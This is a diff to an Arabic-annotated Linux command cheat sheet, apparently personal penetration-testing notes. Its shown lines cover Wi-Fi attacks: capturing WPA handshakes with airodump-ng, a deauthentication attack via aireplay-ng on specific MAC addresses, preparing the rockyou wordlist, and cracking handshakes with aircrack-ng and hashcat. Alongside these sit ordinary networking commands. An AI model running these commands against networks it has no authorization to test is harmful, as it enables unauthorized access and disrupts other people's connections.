@@ -21,7 +21,6 @@ airodump-ng -w rmag -c 11 --bssid CC:BE:59:91:D7:B0 wlan0mon  :  جمع الحز
 aireplay-ng -0 11 -a CC:BE:59:91:D7:B0 -c D0:D0:03:7A:D1:05 wlan0mon  : تنفيذ هجوم deauth بال aireplay-ng
 sudo gzip -d rockyou.txt.gz      cd       cp /usr/share/wordlists/rockyou.txt rockyou.txt     sudo grep -x '.\{8,63\}' rockyou.txt > wparockyou.txt  : الحصول على قائمة كلمات سر مناسبة لاختبارات WPA/WPA2 (التي تقبل كلمات سر من 8 إلى 63 حرفاً فقط) من ملف rockyou الشهير
 
-aircrack-ng hack-01.cap -w /user/share/wordlists/rockyou.txt : استخراج الباسورد من ملف معين 
 sudo /usr/share/hashcat-utils/cap2hccapx.bin shop-*.cap wpa2.hccapx :   تحويل ملفات التقاط حزم الشبكة اللاسلكية (.cap) إلى ملف واحد بصيغة hccapx مناسب لكسر كلمة المرور باستخدام hashcat
 locate wordlists | less :  تبحث عن كل الملفات أو المجلدات التي تحتوي على كلمة wordlists في مسارها
 python3 -m pip install -r requirements.txt : تنصيب المكتبات المتطلبة لتشغيل اداة معينة
@@ -119,3 +118,6 @@ scp file user@host:/path : نسخ ملف إلى جهاز آخر عبر SSH
 rsync -avz source/ dest/ : مزامنة الملفات بين مجلدين
 ping -c 4 8.8.8.8 : اختبار الاتصال بالإنترنت
 traceroute google.com : تتبع مسار الاتصال إلى موقع معين
+sudo airodump-ng -w hand --bssid 98:25:4A:0F:21:37 wlan0mon : لحفظ الهاندشيك
+sudo aircrack-ng -w '/home/kali/Desktop/wordlist/allpasswors2.txt' *.cap : لكسر باسورد جميع الهاندشيكات
+
